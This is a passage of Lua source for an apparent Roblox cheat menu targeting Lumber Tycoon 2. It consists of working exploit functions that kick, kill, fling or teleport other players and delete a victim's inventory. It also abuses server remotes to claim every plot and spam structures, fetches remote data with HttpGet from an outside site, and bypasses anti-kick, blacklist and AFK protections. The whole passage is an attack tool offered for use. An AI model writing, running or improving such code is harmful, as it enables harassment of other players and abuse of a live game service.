	for al, v in pairs(e9.Parent:children()) do
		if v:IsA'Tool' then
			if v:FindFirstChild'Owner' and v.Owner.Value == game.Players.LocalPlayer then
				by = by + 1
			end
		end
	end;
	local noclip = game:GetService'RunService'.Stepped:connect(nocliprun)
	for J = 1, 40 do
		local eb = 0;
		for al, v in pairs(e9.Parent:children()) do
			if v:IsA'Tool' then
				if v:FindFirstChild'Owner' and v.Owner.Value == game.Players.LocalPlayer then
					eb = eb + 1
				end
			end
		end;
		if eb ~= by or not ea.Parent:FindFirstChildOfClass("Tool") then
			wait(0.1)
			break
		end;
		e9.CFrame = ea.Parent:FindFirstChildOfClass("Tool"):FindFirstChildOfClass"Part".CFrame;
		wait()
	end;
	if noclip ~= nil then
		noclip:Disconnect()
		noclip = nil
	end;
	return
end;
function bring_plr(e9, ea, cn)
	wait(0.2)
	local C = Instance.new("BodyGyro", ea)
	local R = math.huge;
	local H = workspace.Gravity;
	workspace.Gravity = 0;
	C.MaxTorque = Vector3.new(8500, 8500, 8500)
	C.P = 50000;
	C.D = 2e2;
	local noclip = game:GetService'RunService'.Stepped:connect(nocliprun)
	okinsta(ea.CFrame + Vector3.new(0, 15, 0))
	C.CFrame = CFrame.new(C.Parent.Position, Vector3.new(R, R, R))
	wait(0.75)
	ea.Velocity = Vector3.new(0, 0, 0)
	ea.RotVelocity = Vector3.new(0, 0, 0)
	okinsta(cn + Vector3.new(0, 20, 0))
	C.CFrame = CFrame.new(C.Parent.Position, Vector3.new(R, R, R))
	wait(0.6)
	C:Destroy()
	if noclip ~= nil then
		noclip:Disconnect()
		noclip = nil
	end;
	for J = 1, 10 do
		ea.Velocity = Vector3.new(0, 0, 0)
		ea.RotVelocity = Vector3.new(0, 0, 0)
		workspace.Gravity = H;
		okinsta(cn)
		okinsta(cn * CFrame.Angles(0, math.rad(math.random(-45, 45)), 0))
		wait()
	end;
	wait(0.4)
end;
function final_kick(v)
	while b3 and not b do
	end;
	if isdev(v.Name) then
		return
	end;
	if v.Character.Humanoid.SeatPart ~= nil then
		x("Player Tools Failed", "Player is currently sitting.", 3)
		return
	end;
	local aH = game:GetService'Players'.LocalPlayer;
	local cn = aH.Character.HumanoidRootPart.CFrame;
	if not prepare_plr(aH, cn) then
		return
	end;
	local ec = CFrame.new(math.random(5000, 20000), math.random(50, 200), math.random(5000, 20000))
	okinsta(ec)
	wait(0.2)
	local e6 = aH.Character;
	local ed = v.Character;
	local e7 = aH.Character.Humanoid;
	local ea = aH.Character.HumanoidRootPart;
	local e9 = v.Character.HumanoidRootPart;
	local aN = workspace.Gravity;
	equip_plr(e6, true)
	wait(0.1)
	local e8 = glitch_plr(e6, e7, true)
	workspace.Gravity = 0;
	attach_plr(e9, ea, true)
	wait(1.5)
	workspace.Gravity = aN;
	aH.Character.Head:Destroy()
	n = false;
	aH.CharacterAdded:Wait()
	aH.Character:WaitForChild'HumanoidRootPart'
	wait(0.3)
	okinsta(cn)
end;
function final_kick_b(v)
	if isdev(v.Name) then
		return
	end;
	local aH = game:GetService'Players'.LocalPlayer;
	local cn = aH.Character.HumanoidRootPart.CFrame;
	if not prepare_plr(aH, cn) then
		return
	end;
	local e6 = aH.Character;
	local ed = v.Character;
	local e7 = aH.Character.Humanoid;
	local ea = aH.Character.HumanoidRootPart;
	local e9 = v.Character.HumanoidRootPart;
	equip_plr(e6, true)
	wait(0.1)
	local e8 = glitch_plr(e6, e7)
	attach_plr(e9, ea)
	wait(1.5)
	aH.Character.Head:Destroy()
	n = false;
	aH.CharacterAdded:Wait()
	aH.Character:WaitForChild'HumanoidRootPart'
	wait(0.3)
	okinsta(cn)
end;
function final_control(v)
	if isdev(v.Name) then
		return
	end;
	if v.Character.Humanoid.SeatPart ~= nil then
		x("Player Tools Failed", "Player is currently sitting.", 3)
		return
	end;
	local aH = game:GetService'Players'.LocalPlayer;
	local ee = 0;
	if aH.Character:FindFirstChild("Tool") ~= nil then
		aH.Character.Humanoid:UnequipTools()
	end;
	local axe = nil;
	for J, cp in pairs(aH.Backpack:children()) do
		if cp.Name ~= "BlueprintTool" then
			if not axe then
				axe = cp.ToolName.Value
			end;
			ee = ee + 1
		end
	end;
	if ee ~= 1 then
		x("Player Tools Failed", "You must have EXACTLY 1 tool to proceed. Use Dupe Inventory in current slot if you don't have enough.", 3)
		return
	end;
	local cn = aH.Character.HumanoidRootPart.CFrame;
	local ef = nil;
	local eg = workspace.PlayerModels.ChildAdded:connect(function(V)
		if V:WaitForChild"Owner".Value == game.Players.LocalPlayer and V:WaitForChild"ItemName".Value == axe then
			ef = V
		end
	end)
	if not prepare_plr(aH, cn) then
		return
	end;
	local bY = true;
	repeat
		local e6 = aH.Character;
		local ed = v.Character;
		local e7 = aH.Character.Humanoid;
		local ea = aH.Character.HumanoidRootPart;
		local e9 = v.Character.HumanoidRootPart;
		okinsta(e9.CFrame)
		game:GetService("ReplicatedStorage").Interaction.ClientInteracted:FireServer(ef, "Pick up tool")
		repeat
			wait()
		until e6:FindFirstChildOfClass("Tool")
		wait(0.1)
		local e8 = glitch_plr(e6, e7)
		for J, v in pairs(e6:GetDescendants()) do
			if v:IsA("BasePart") then
				v.Transparency = 1
			end
		end;
		attach_plr(e9, ea)
		aH.CharacterAdded:Wait()
		aH.Character:WaitForChild'HumanoidRootPart'
		wait()
		normalinvdupe()
	until _G.AbortControlling;
	if eg ~= nil then
		eg:Disconnect()
		eg = nil
	end;
	_G.AbortControlling = false;
	n = false;
	wait(0.3)
	okinsta(cn)
end;
function final_kill(v)
	if v.Character.Humanoid.SeatPart ~= nil then
		x("Player Tools Failed", "Player is currently sitting.", 3)
		return
	end;
	local aH = game:GetService'Players'.LocalPlayer;
	local cn = aH.Character.HumanoidRootPart.CFrame;
	if not prepare_plr(aH, cn) then
		return
	end;
	local eh = CFrame.new(v.Character.HumanoidRootPart.CFrame.X, v.Character.HumanoidRootPart.CFrame.Y - 200, v.Character.HumanoidRootPart.CFrame.Z)
	local ei = Instance.new("Part", workspace)
	ei.Anchored = true;
	ei.Size = Vector3.new(30, 2, 30)
	ei.CFrame = eh + Vector3.new(0, -2, 0)
	local ej = CFrame.new(ei.Position + Vector3.new(5, 7, 5))
	local e6 = aH.Character;
	local ed = v.Character;
	local e7 = aH.Character.Humanoid;
	local ea = aH.Character.HumanoidRootPart;
	local e9 = v.Character.HumanoidRootPart;
	local e8 = glitch_plr(e6, e7)
	equip_plr(e6)
	okinsta(e9.CFrame)
	attach_plr(e9, ea)
	repeat
		wait(0.2)
		okinsta(ej)
	until not v.Character:FindFirstChild("HumanoidRootPart") or aH.Character:FindFirstChild("HumanoidRootPart")
	wait(0.3)
	aH.Character.Head:Destroy()
	n = false;
	aH.CharacterAdded:Wait()
	aH.Character:WaitForChild'HumanoidRootPart'
	wait(0.3)
	okinsta(cn)
	ei:Destroy()
end;
function final_hardkill(v)
	if v.Character.Humanoid.SeatPart ~= nil then
		x("Player Tools Failed", "Player is currently sitting.", 3)
		return
	end;
	local aH = game:GetService'Players'.LocalPlayer;
	local ek = aH.Character.HumanoidRootPart.CFrame;
	if not prepare_plr(aH, ek) then
		return
	end;
	local e6 = aH.Character;
	local ed = v.Character;
	local e7 = aH.Character.Humanoid;
	local ea = aH.Character.HumanoidRootPart;
	local e9 = v.Character.HumanoidRootPart;
	local e8 = glitch_plr(e6, e7)
	local cn = CFrame.new(-1685, 175, 1216)
	equip_plr(e6)
	okinsta(e9.CFrame)
	attach_plr(e9, ea)
	wait(0.1)
	bring_plr(e9, ea, cn)
	wait(0.3)
	if aH.Character.Head then
		aH.Character.Head:Destroy()
	end;
	n = false;
	aH.CharacterAdded:Wait()
	aH.Character:WaitForChild'HumanoidRootPart'
	wait(0.5)
	okinsta(ek)
end;
function final_fling(v)
	if v.Character.Humanoid.SeatPart ~= nil then
		x("Player Tools Failed", "Player is currently sitting.", 3)
		return
	end;
	local aH = game:GetService'Players'.LocalPlayer;
	local cn = aH.Character.HumanoidRootPart.CFrame;
	if not prepare_plr(aH, cn) then
		return
	end;
	local e6 = aH.Character;
	local ed = v.Character;
	local e7 = aH.Character.Humanoid;
	local ea = aH.Character.HumanoidRootPart;
	local e9 = v.Character.HumanoidRootPart;
	local e8 = glitch_plr(e6, e7)
	equip_plr(e6)
	okinsta(e9.CFrame)
	attach_plr(e9, ea)
	local el = 600;
	ea.Velocity = Vector3.new(el, el, el)
	ea.RotVelocity = Vector3.new(el, el, el)
	wait(0.5)
	aH.Character.Head:Destroy()
	n = false;
	aH.CharacterAdded:Wait()
	aH.Character:WaitForChild'HumanoidRootPart'
	wait(0.5)
	okinsta(cn)
end;
function final_bring(v)
	if v.Character.Humanoid.SeatPart ~= nil then
		x("Player Tools Failed", "Player is currently sitting.", 3)
		return
	end;
	local aH = game:GetService'Players'.LocalPlayer;
	local cn = aH.Character.HumanoidRootPart.CFrame;
	if not prepare_plr(aH, cn) then
		return
	end;
	local e6 = aH.Character;
	local ed = v.Character;
	local e7 = aH.Character.Humanoid;
	local ea = aH.Character.HumanoidRootPart;
	local e9 = v.Character.HumanoidRootPart;
	local e8 = glitch_plr(e6, e7)
	equip_plr(e6)
	okinsta(e9.CFrame)
	wait(0.2)
	attach_plr(e9, ea)
	bring_plr(e9, ea, cn)
	wait(0.3)
	okinsta(cn)
	aH.Character.Head:Destroy()
	n = false;
	aH.CharacterAdded:Wait()
	aH.Character:WaitForChild'HumanoidRootPart'
	wait(0.5)
	okinsta(cn)
end;
function final_tbring(v)
	if v.Character.Humanoid.SeatPart ~= nil then
		x("Player Tools Failed", "Player is currently sitting.", 3)
		return
	end;
	local aH = game:GetService'Players'.LocalPlayer;
	local cn = aH.Character.HumanoidRootPart.CFrame;
	if not prepare_plr(aH, cn) then
		return
	end;
	local e6 = aH.Character;
	local ed = v.Character;
	local e7 = aH.Character.Humanoid;
	local ea = aH.Character.HumanoidRootPart;
	local e9 = v.Character.HumanoidRootPart;
	local e8 = glitch_plr(e6, e7)
	equip_plr(e6)
	okinsta(e9.CFrame)
	attach_plr(e9, ea)
	wait(0.2)
	n = true;
	local aM = (cn.p - ea.CFrame.p).Magnitude;
	if aM / 400 < 3 then
		aM = aM / 400
	else
		aM = 3
	end;
	local aO = game:GetService("TweenService"):Create(ea, TweenInfo.new(aM, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, 0, false, 0), {
		CFrame = cn
	})
	aO:Play()
	aO.Completed:Wait()
	n = false;
	wait(0.3)
	okinsta(cn)
	aH.Character.Head:Destroy()
	n = false;
	aH.CharacterAdded:Wait()
	aH.Character:WaitForChild'HumanoidRootPart'
	wait(0.5)
	okinsta(cn)
end;
e4:Create("Button", "Fast Kick Player", function()
	if not e1 then
		return
	end;
	final_kick_b(userparse(e1))
end, {
	text = ""
})
local em = {}
e4:Create("Button", "Toggle Auto-Kick Player", function()
	if not e1 then
		return
	end;
	local u = userparse(e1).Name;
	local V = false;
	for J, v in pairs(em) do
		if v == u then
			V = J
		end
	end;
	if V == false then
		x("Auto-Kick", "Now auto-kicking "..u..".", 5)
		final_kick_b(userparse(u))
		table.insert(em, u)
	else
		x("Auto-Kick", "No longer auto-kicking "..u..".", 5)
		em[V] = nil
	end
end, {
	text = ""
})
local bV = ""
local en = Instance.new("BindableFunction", workspace)
en.Name = "BARKINT_Autokickhandler"
local eo = Instance.new("BindableFunction", workspace)
eo.Name = "BARKINT_Autokickhandler2"
eo.OnInvoke = function(v)
	local aB = game.Players.LocalPlayer.Character;
	local aH = game.Players.LocalPlayer;
	if v ~= "Cancel" then
		if not aH.Backpack:FindFirstChildOfClass"Tool" and not aB:FindFirstChildOfClass"Tool" then
			local axe = autobuy("BasicHatchet", 1)
			if axe == nil then
				return
			end;
			readyt = 0;
			local ep = workspace.PlayerModels.ChildAdded:connect(function(y)
				if y:WaitForChild"ToolName" then
					if tostring(y.ToolName.Value) == "BasicHatchet" then
						game:GetService("ReplicatedStorage").Interaction.ClientInteracted:FireServer(y, "Pick up tool")
						readyt = 1
					end
				end
			end)
			game:GetService("ReplicatedStorage").Interaction.ClientInteracted:FireServer(axe, "Open box")
			repeat
				wait()
			until readyt == 1;
			wait(0.5)
			ep:Disconnect()
			ep = nil
		end;
		x("Auto-Kick", "Waiting...", 5)
		wait(5)
		final_kick_b(userparse(bV))
	end
end;
en.OnInvoke = function(v)
	if v == "Cancel" then
		return
	end;
	local aB = game.Players.LocalPlayer.Character;
	local aH = game.Players.LocalPlayer;
	if not aH.Backpack:FindFirstChildOfClass"Tool" and not aB:FindFirstChildOfClass"Tool" then
		game.StarterGui:SetCore("SendNotification", {
			Title = "Auto-Kick",
			Text = "You do not have an axe. Auto-buy a basic hatchet?",
			Icon = nil,
			Duration = 6,
			Button1 = "Autobuy",
			Button2 = "Cancel",
			Callback = eo
		})
	else
		x("Auto-Kick", "Waiting...", 5)
		wait(5)
		final_kick_b(userparse(bV))
	end
end;
game.Players.ChildAdded:connect(function(Q)
	for J, v in pairs(em) do
		if v == Q.Name then
			bV = v;
			game.StarterGui:SetCore("SendNotification", {
				Title = "Auto-Kick",
				Text = v.." has joined the game. Would you like to kick them?",
				Icon = nil,
				Duration = 8,
				Button1 = "Kick",
				Button2 = "Cancel",
				Callback = en
			})
		end
	end
end)
e4:Create("Button", "Car Annoy Player", function()
	if not e1 then
		return
	end;
	if not userparse(e1) then
		return
	end;
	local eq = userparse(e1).Character;
	local aB = game.Players.LocalPlayer.Character;
	repeat
		wait(0.05)
		if (eq.HumanoidRootPart.CFrame.p - aB.HumanoidRootPart.CFrame.p).Magnitude > 10 or not eq.Humanoid.SeatPart then
			_G.DogixLT2TPC(eq.HumanoidRootPart.CFrame, o)
		end
	until eq.Humanoid.Health == 0 or aB.Humanoid.Health == 0 or not aB.Humanoid.SeatPart or not aB.Humanoid.Seated;
	final_kick()
end, {
	animated = true
})
e4:Create("Button", "View Player", function()
	if not e1 then
		return
	end;
	if not userparse(e1) then
		return
	end;
	workspace.CurrentCamera.CameraSubject = userparse(e1).Character
end, {
	text = ""
})
e4:Create("Button", "Kill Player", function()
	if not e1 then
		return
	end;
	final_kill(userparse(e1))
end, {
	text = ""
})
e4:Create("Button", "Hard-Kill Player (deletes players inventory)", function()
	if not e1 then
		return
	end;
	final_hardkill(userparse(e1))
end, {
	text = ""
})
e4:Create("Button", "Fling Player", function()
	if not e1 then
		return
	end;
	final_fling(userparse(e1))
end, {
	text = ""
})
e4:Create("Button", "Bring Player", function()
	if not e1 then
		return
	end;
	final_bring(userparse(e1))
end, {
	text = ""
})
-- e4:Create("Button", "Tween Bring Player (safe)", function()
-- 	if not e1 then
-- 		return
-- 	end;
-- 	final_tbring(userparse(e1))
-- end, {
-- 	text = ""
-- })
if firetouchinterest then
	e4:Create("Button", "Spawn Fireball at Player", function()
		if not e1 then
			return
		end;
		local er = userparse(e1)
		local aH = game.Players.LocalPlayer;
		local es = workspace["Region_Volcano"]:FindFirstChild("Lava") or game.Lighting:FindFirstChild("Lava")
		local et = aH.Character["Left Leg"]
		local eu = false;
		if es.Parent == game.Lighting then
			eu = true;
			es.Parent = workspace["Region_Volcano"]
		end;
		es = es.Lava;
		ftouch(et, es, true)
		ftouch(et, es, false)
		wait(0.75)
		et.CFrame = er.Character.HumanoidRootPart.CFrame;
		game.Players.LocalPlayer.Character.Head:Destroy()
		if eu then
			es.Parent.Parent = game.Lighting;
			eu = false
		end
	end, {
		text = ""
	})
end;
local ev = false;
local ew = ""
e4:Create("Toggle", "Spam Player with Swamp Bridge", function(db)
	if not e1 then
		return
	end;
	if db then
		ev = false;
		local aH = userparse(e1)
		local ex = aH.Character;
		ew = aH.Name;
		if not _G.InfRanges then
			x("Spam Swamp Bridge", "This feature requires Infinite Range.", 2)
			return
		end;
		local part = workspace["Region_Mountainside"].SlabRegen.Slab.Slider;
		repeat
			wait()
			part.CFrame = ex.HumanoidRootPart.CFrame + Vector3.new(0, 2, 0)
			if part.Parent:FindFirstChild("PushMe") then
				part.Parent.PushMe.CFrame = ex.HumanoidRootPart.CFrame + Vector3.new(0, 2, 0)
			end
		until ew ~= aH.Name or aH == nil or ev or ex == nil or part == nil
	else
		ev = true
	end
end, {
	default = false
})
local ey = e3:CreateSection("Other Players")
_G.Blacklist = nil;
_G.Whitelist = nil;
ey:Create("Toggle", "Auto-Blacklist", function(db)
	if _G.Blacklist == nil then
		for J, v in pairs(game:GetService'Players':GetPlayers()) do
			if v.Name ~= game:GetService'Players'.LocalPlayer.Name then
				game.ReplicatedStorage.Interaction.ClientSetListPlayer:InvokeServer(game:GetService'Players'.LocalPlayer.BlacklistFolder, v, true)
			end
		end;
		_G.Blacklist = game:GetService'Players'.PlayerAdded:connect(function(aH)
			game.ReplicatedStorage.Interaction.ClientSetListPlayer:InvokeServer(game:GetService'Players'.LocalPlayer.BlacklistFolder, aH, true)
		end)
	else
		_G.Blacklist:Disconnect()
		_G.Blacklist = nil
	end
end, {
	default = false
})
ey:Create("Toggle", "Auto-Whitelist", function(db)
	if _G.Whitelist == nil then
		for J, v in pairs(game:GetService'Players':GetPlayers()) do
			if v.Name ~= game:GetService'Players'.LocalPlayer.Name then
				game.ReplicatedStorage.Interaction.ClientSetListPlayer:InvokeServer(game:GetService'Players'.LocalPlayer.WhitelistFolder, v, true)
			end
		end;
		_G.Whitelist = game:GetService'Players'.PlayerAdded:connect(function(aH)
			game.ReplicatedStorage.Interaction.ClientSetListPlayer:InvokeServer(game:GetService'Players'.LocalPlayer.WhitelistFolder, aH, true)
		end)
	else
		_G.Whitelist:Disconnect()
		_G.Whitelist = nil
	end
end, {
	default = false
})
ey:Create("Toggle", "Anti-Kick", function(db)
	_G.Nokick = db;
	if _G.Nokick then
		_G.Nokicking = game:GetService'RunService'.RenderStepped:connect(function()
			for J, v in pairs(game:GetService'Players'.LocalPlayer.Character:children()) do
				if v:IsA'Tool' and v:FindFirstChild'Owner'.Value ~= game:GetService'Players'.LocalPlayer then
					if not v.Owner.Value.Character:FindFirstChildOfClass'Humanoid' then
						v.Parent = game.Lighting;
						game.Players.LocalPlayer.Character.Head:Destroy()
					end
				end
			end
		end)
	else
		_G.Nokicking:Disconnect()
		_G.Nokicking = nil
	end
end, {
	default = false
})
ey:Create("Toggle", "Sit in Any Car (may break your cars)", function(db)
	game:GetService("Players").LocalPlayer.PlayerGui.Scripts.SitPermissions.Disabled = db
end, {
	default = false
})
if getconnections then
	ey:Create("Button", "Anti-AFK", function()
		for J, v in pairs(getconnections(game.Players.LocalPlayer.Idled)) do
			if v["Disable"] then
				v["Disable"](v)
			elseif v["Disconnect"] then
				v["Disconnect"](v)
			end
		end;
		x("Anti-AFK", "Loaded.", 3)
	end, {
		animated = true
	})
end;
ey:Create("Button", "Anti-Blacklist", function()
	local aH = game.Players.LocalPlayer;
	local cn = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame;
	for J, v in next, workspace:GetDescendants() do
		if v:IsA("SpawnLocation") then
			v.Touched:Connect(function(I)
				if I.Parent == aH.Character and cn then
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = cn
				end
			end)
		end
	end;
	game:GetService'RunService'.RenderStepped:connect(function()
		if string.match(game:GetService'Players'.LocalPlayer.PlayerGui.NoticeGUI.Notice.Main.TextLabel.Text, "blacklisted") and game:GetService'Players'.LocalPlayer.PlayerGui.NoticeGUI.Notice.Main.Visible == true then
			game:GetService'Players'.LocalPlayer.PlayerGui.NoticeGUI.Notice.Main.Visible = false
		end;
		cn = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
	end)
	while wait(0.2) do
		for J, v in next, workspace.Effects:GetChildren() do
			if v:IsA("BasePart") and v.Name == "BlacklistWall" then
				v:Destroy()
			end
		end
	end
end, {
	animated = true
})
ey:Create("Button", "No Axe Pickup (will lose axes, rejoin to fix)", function()
	local aH = game.Players.LocalPlayer;
	function drop()
		for J, cp in pairs(aH.Character:children()) do
			if cp:IsA'Tool' then
				cp.Parent = aH.Backpack
			end
		end;
		for J, cp in pairs(aH.Backpack:children()) do
			game:GetService("ReplicatedStorage").Interaction.ClientInteracted:FireServer(cp, "Drop tool", aH.Character.HumanoidRootPart.CFrame)
		end
	end;
	local am = workspace.PlayerModels.ChildAdded:connect(function(v)
		if v:WaitForChild'Owner'.Value == aH and v:WaitForChild("ToolName") then
			repeat
				wait()
				game:GetService("ReplicatedStorage").Interaction.ClientInteracted:FireServer(v, "Pick up tool")
			until not v
		end
	end)
	for J = 1, 500 do
		wait()
		drop()
	end;
	am:Disconnect()
	am = nil
end, {
	animated = true
})
function dumpToTable(string,forcegray)
	local nrml = game:GetService("HttpService"):JSONDecode(q.decode(string:split'\n'[2]))
	local newtbl = {}
	for i,v in pairs (nrml) do
	    if v.Blueprint == "Floor1Large" and (v.WoodType == nil or forcegray) then
	        for i2,v2 in pairs (get_fake_large_floor_points(CFrame.new(unpack(v.CFrame)))) do
	            table.insert(newtbl, {
	                ["Blueprint"] = "Wall2Tall",
	                ["CFrame"] = {v2:components()},
	                ["WoodType"] = nil
	            })
	        end
	    elseif v.Blueprint == "Floor1" and (v.WoodType == nil or forcegray) then
            table.insert(newtbl, {
                ["Blueprint"] = "Wall2",
                ["CFrame"] = {get_fake_floor_point(CFrame.new(unpack(v.CFrame))):components()}
            })
	    elseif v.Blueprint == "Floor2Large" and (v.WoodType == nil or forcegray) then
	        for i,v in pairs (get_fake_large_tile_points(CFrame.new(unpack(v.CFrame)))) do
                table.insert(newtbl, {
                    ["Blueprint"] = "Floor2Small",
                    ["CFrame"] = {v:components()}
                })
            end
	    elseif v.Blueprint == "Floor2" and (v.WoodType == nil or forcegray) then
	        for i,v in pairs (get_fake_tile_points(CFrame.new(unpack(v.CFrame)))) do
                table.insert(newtbl, {
                    ["Blueprint"] = "Floor2Small",
                    ["CFrame"] = {v:components()}
                })
            end
	    elseif v.Blueprint == "Stair1" and (v.WoodType == nil or forcegray) then
            local pts = get_fake_stair_points(CFrame.new(unpack(v.CFrame)))
            table.insert(newtbl, {
                ["Blueprint"] = "Post",
                ["CFrame"] = {pts.Post1:components()}
            })
            table.insert(newtbl, {
                ["Blueprint"] = "Post",
                ["CFrame"] = {pts.Post2:components()}
            })
            table.insert(newtbl, {
                ["Blueprint"] = "Floor1Small",
                ["CFrame"] = {pts.Floor2:components()}
            })
            table.insert(newtbl, {
                ["Blueprint"] = "Floor1Small",
                ["CFrame"] = {pts.Floor1:components()}
            })
            table.insert(newtbl, {
                ["Blueprint"] = "Stair2",
                ["CFrame"] = {pts.Stairs:components()}
            })
        else
            table.insert(newtbl, v)
        end
	end
	return newtbl
end;
function shuffle(at)
	shuffled = {}
	for J, v in ipairs(at) do
		local c6 = math.random(1, #shuffled + 1)
		table.insert(shuffled, c6, v)
	end;
	return shuffled
end;
local ey = e3:CreateSection("Plot Trolling")
ey:Create("Button", "Claim All Plots", function(db)
    if game.Players.LocalPlayer.CurrentSaveSlot.Value ~= -1 then
		x("Claim All Plots", "To prevent data loss, you cannot have a loaded plot.", 3)
		return
	end;
	for J, v in pairs(workspace.Properties:children()) do
		if v.Owner.Value == nil then
			game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(v)
		end
	end;
	if adding_walls then
		local ez = shuffle(dumpToTable(game:HttpGet("https://dogix.wtf/scripts/lt2/barkdata/structures/SmallWall")))
		local bi = 0;
		local eA = {}
		local eB = workspace.PlayerModels.ChildAdded:connect(function(cC)
			cC:WaitForChild("Owner")
			if cC.Owner.Value == game.Players.LocalPlayer then
				repeat
					wait()
				until cC:FindFirstChild("ItemName") and cC:FindFirstChild("Type") or wait(3)
				if not(cC:FindFirstChild("ItemName") and cC:FindFirstChild("Type")) then
					return
				end;
				if cC.Type.Value == "Blueprint" then
					game:GetService("ReplicatedStorage").PlaceStructure.ClientPlacedStructure:FireServer(cC.ItemName.Value, cC.PrimaryPart.CFrame, game:GetService'Players'.LocalPlayer, nil, cC, true)
					table.insert(eA, "#barkwinning")
				end
			end
		end)
		for eC, eD in pairs(landarray) do
			for eE = 0, maxiwall do
				for J, v in pairs(ez) do
					bi = bi + 1;
					if bi >= 40 then
						repeat
							wait()
						until #eA >= 39;
						eA = {}
						bi = 0
					end;
					spawn(function()
						game:GetService("ReplicatedStorage").PlaceStructure.ClientPlacedBlueprint:FireServer(v.Blueprint, CFrame.new(unpack(v.CFrame)) + eD.OriginSquare.CFrame.p + Vector3.new(0, 8 * eE, 0), game.Players.LocalPlayer)
					end)
				end
			end
		end;
		wait(1)
		eB:Disconnect()
		eB = nil
	end
end, {
	animated = true
})
local maxiwall = 0;
ey:Create("Toggle", "Add Walls", function(db)
	local landarray = {}
	for J, v in pairs(workspace.Properties:children()) do
		if v.Owner.Value == nil then
			table.insert(landarray, v)
			game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(v)
		end
	end
end, {
	default = false
})
ey:Create("Slider", "Wall Height", function(v)
	maxiwall = v - 1
end, {
	min = 1,
	max = 5,
	default = 1,
	changablevalue = true
})
local ey = e3:CreateSection("Spawn Building")
ey:Create("Button", "Initiate Spawn Building", function(db)
	for J, v in pairs(workspace.Properties:children()) do
		if v.Owner.Value == game.Players.LocalPlayer then
			x("Spawn Building", "To prevent data loss, you cannot have a claimed plot.", 3)
			return
		end
	end;
	x("Spawn Building", "Loading Spawn Builder...", 3)
	local eF = nil;
	local eG = nil;
	for J, v in pairs(workspace.Properties:children()) do
		if v.Owner.Value == nil then
			game:GetService("ReplicatedStorage").PropertyPurchasing.ClientPurchasedProperty:FireServer(v, v.OriginSquare.CFrame.p)
			eF = v.OriginSquare;
			eG = eF.CFrame;
			break
		end
	end;
	k = true;
	if not eF then
		x("Spawn Building", "No plots to continue.")
		return
	end;
	x("Spawn Building", "Waiting for sign.", 3)
	local eH = nil;
	local eI = workspace.Effects.ChildAdded:connect(function(v)
		v:WaitForChild("DirtParticles", 3)
		if v:FindFirstChild("DirtParticles") then
			eH = v
		end
	end)
	repeat
		wait()
	until eH ~= nil;
	eH.AncestryChanged:wait()
	x("Spawn Building", "Selling sign.", 3)
	sellLandSign(true)
	repeat
		wait()
	until game.Players.LocalPlayer.leaderstats.Money.Value ~= 20;
	eI:Disconnect()
	eI = nil;
	local eJ = autobuy("UtilityTruck", 1)
	local eK = nil;
	if not eJ then
		x("Spawn Building", "Autobuy for truck failed.")
		return
	end;
	local eI = workspace.PlayerModels.ChildAdded:connect(function(v)
		v:WaitForChild("Owner")
		if v.Owner.Value == game.Players.LocalPlayer then
			v:WaitForChild("Type", 3)
			if v.Type.Value == "Vehicle" then
				v:WaitForChild("DriveSeat")
				for J = 1, 20 do
					if game.Players.LocalPlayer.Character.Humanoid.SeatPart ~= nil then
						break
					end;
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Main.CFrame;
					v.DriveSeat:Sit(game.Players.LocalPlayer.Character.Humanoid)
					wait(0.1)
				end;
				eJ = v
			end;
			if v.Type.Value == "Vehicle Spot" then
				eK = v
			end
		end
	end)
	game:GetService("ReplicatedStorage").PlaceStructure.ClientPlacedStructure:FireServer("UtilityTruck", eF.CFrame + Vector3.new(0, -5.775, 0), game:GetService("Players").LocalPlayer, nil, eJ, false, true)
	repeat
		wait()
	until game.Players.LocalPlayer.Character.Humanoid.SeatPart ~= nil;
	eI:Disconnect()
	eI = nil;
	game.ReplicatedStorage.Interaction.ClientSetListPlayer:InvokeServer(game:GetService'Players'.LocalPlayer.BlacklistFolder, game.Players.LocalPlayer, true)
	repeat
		wait()
	until eG ~= eF.CFrame;
	game.ReplicatedStorage.Interaction.ClientSetListPlayer:InvokeServer(game:GetService'Players'.LocalPlayer.BlacklistFolder, game.Players.LocalPlayer, false)
	maxLand()
	wait(0.25)
	game.Players.LocalPlayer.Character.Humanoid.Sit = false;
	wait(0.5)
	_G.DogixLT2TPC(eF.CFrame + Vector3.new(0, 5, 0), o)
	if eK ~= nil then
		game.ReplicatedStorage.Interaction.DestroyStructure:FireServer(eK)
	end;
	if eJ ~= nil then
		game.ReplicatedStorage.Interaction.DestroyStructure:FireServer(eJ)
	end;
	x("Spawn Building", "Done!", 3)
end, {
	animated = true
})
local d7 = "Environment"
if d then
	d7 = 5711811936
end;
local eL = d6:CreateCategory(d7)
local eM = eL:CreateSection("Main Features")
eM:Create("Toggle", "Always Day", function(db)
	_G.alwaysday_toggle = db
end, {
	default = false
})
eM:Create("Toggle", "Always Night", function(db)
	_G.alwaysnight_toggle = db
end, {
	default = false
})
eM:Create("Toggle", "No Fog", function(db)
	_G.nofog_toggle = db
end, {
	default = false
})
eM:Create("Toggle", "Spook Lighting", function(db)
	_G.spook_toggle = db
end, {
	default = false
})
eM:Create("Toggle", "Solid Water", function(db)
	_G.wtr_toggle = db;
	for J, v in pairs(workspace.Water:children()) do
		if v.Name == "Water" then
			v.CanCollide = not v.CanCollide
		end
	end;
	for J, v in pairs(workspace.Bridge.VerticalLiftBridge.WaterModel:children()) do
		if v.Name == "Water" then
			v.CanCollide = not v.CanCollide
		end
	end
end, {
	default = false
})
eM:Create("Button", "Delete Water", function()
	for J, v in pairs(workspace.Water:children()) do
		if v.Name == "Water" then
			v:Destroy()
		end
	end;
	for J, v in pairs(workspace.Bridge.VerticalLiftBridge.WaterModel:children()) do
		if v.Name == "Water" then
			v:Destroy()
		end
	end;
	game:GetService'Players'.LocalPlayer.PlayerGui.Scripts.CharacterFloat.Disabled = true;
	game:GetService'StarterGui'.Scripts.CharacterFloat.Disabled = true
end, {
	animated = true
})
eM:Create("Button", "No Water Float and Damage", function()
	game:GetService'Players'.LocalPlayer.PlayerGui.Scripts.CharacterFloat.Disabled = true;
	game:GetService'StarterGui'.Scripts.CharacterFloat.Disabled = true
end, {
	animated = true
})
eM:Create("Toggle", "Disable Lava", function(db)
	_G.lava_toggle = db;
